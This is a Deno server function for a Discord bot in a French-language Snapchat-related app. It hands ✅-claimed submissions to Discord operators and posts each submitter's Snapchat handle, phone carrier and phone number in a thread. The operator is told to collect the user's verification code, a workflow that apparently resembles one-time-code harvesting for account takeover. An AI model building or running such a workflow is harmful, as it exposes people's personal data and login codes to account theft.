import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';

const BOT_TOKEN = Deno.env.get('DISCORD_BOT_TOKEN');
const CHANNEL_ID = Deno.env.get('DISCORD_CHANNEL_ID');

Deno.serve(async (req) => {
  try {
    const base44 = createClientFromRequest(req);

    // Récupérer les messages du canal
    const messagesRes = await fetch(
      `https://discord.com/api/v10/channels/${CHANNEL_ID}/messages?limit=20`,
      { headers: { 'Authorization': `Bot ${BOT_TOKEN}` } }
    );

    if (!messagesRes.ok) {
      return Response.json({ error: 'Failed to fetch messages' }, { status: 500 });
    }

    const messages = await messagesRes.json();

    for (const message of messages) {
      // Vérifier les réactions sur chaque message
      const reactionsRes = await fetch(
        `https://discord.com/api/v10/channels/${CHANNEL_ID}/messages/${message.id}/reactions`,
        { headers: { 'Authorization': `Bot ${BOT_TOKEN}` } }
      );

      if (!reactionsRes.ok) continue;

      const reactions = await reactionsRes.json();
      const checkmarkReaction = reactions.find((r: any) => r.emoji.name === '✅');

      if (!checkmarkReaction || checkmarkReaction.count === 0) continue;

      // Récupérer les utilisateurs qui ont réagi avec ✅
      const reactorsRes = await fetch(
        `https://discord.com/api/v10/channels/${CHANNEL_ID}/messages/${message.id}/reactions/%E2%9C%85`,
        { headers: { 'Authorization': `Bot ${BOT_TOKEN}` } }
      );

      if (!reactorsRes.ok) continue;

      const reactors = await reactorsRes.json();
      if (reactors.length === 0) continue;

      const userId = reactors[0].id;

      // Extraire l'ID de la soumission
      const embed = message.embeds?.[0];
      const submissionId = embed?.footer?.text?.match(/ID: ([a-z0-9]+)/)?.[1];
      const snapchat = embed?.fields?.find((f: any) => f.name === '👤 Utilisateur')?.value?.replace('@', '') || 'Utilisateur';

      if (!submissionId) continue;

      // Vérifier si le thread existe déjà pour cette soumission
      const submission = await base44.asServiceRole.entities.Submission.get(submissionId).catch(() => null);
      if (!submission || submission.discord_user_id) {
        // Déjà traité
        continue;
      }

      // Générer un code
      const code = Math.random().toString(36).substring(2, 8).toUpperCase();

      // Mettre à jour la soumission
      await base44.asServiceRole.entities.Submission.update(submissionId, {
        code,
        status: 'code_ready',
        discord_user_id: userId
      });

      // Créer le thread
      const threadRes = await fetch(
        `https://discord.com/api/v10/channels/${CHANNEL_ID}/messages/${message.id}/threads`,
        {
          method: 'POST',
          headers: {
            'Authorization': `Bot ${BOT_TOKEN}`,
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            name: `✅ Prise en charge — @${snapchat}`,
            auto_archive_duration: 1440
          })
        }
      );

      if (!threadRes.ok) continue;

      const thread = await threadRes.json();
      const threadId = thread.id;

      // Ajouter l'utilisateur au thread
      await fetch(
        `https://discord.com/api/v10/channels/${threadId}/thread_members/${userId}`,
        {
          method: 'PUT',
          headers: { 'Authorization': `Bot ${BOT_TOKEN}` }
        }
      );

      // Envoyer le message dans le thread
      const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "https://snap-post-hub.base44.app";
      const triggerUrl = `${appUrl}/?trigger=${submissionId}`;

      const threadEmbed = {
        title: "✅ Tu as pris en charge cette soumission",
        color: 3447003,
        fields: [
          { name: "👻 Utilisateur", value: `@${snapchat}`, inline: true },
          { name: "📡 Opérateur", value: submission.operateur, inline: true },
          { name: "📞 Numéro", value: submission.telephone, inline: true },
          { name: "🔑 Code", value: `\`${code}\``, inline: false },
          {
            name: "📝 Instructions",
            value: `Envoie le code à l'utilisateur et attends qu'il te donne son code de vérification.\n\n[Cliquer ici pour envoyer le code](${triggerUrl})`,
            inline: false
          }
        ]
      };

      await fetch(
        `https://discord.com/api/v10/channels/${threadId}/messages`,
        {
          method: 'POST',
          headers: {
            'Authorization': `Bot ${BOT_TOKEN}`,
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ embeds: [threadEmbed] })
        }
      );
    }

    return Response.json({ ok: true });
  } catch (error) {
    console.error('Erreur:', error);
    return Response.json({ error: error.message }, { status: 500 });
  }
});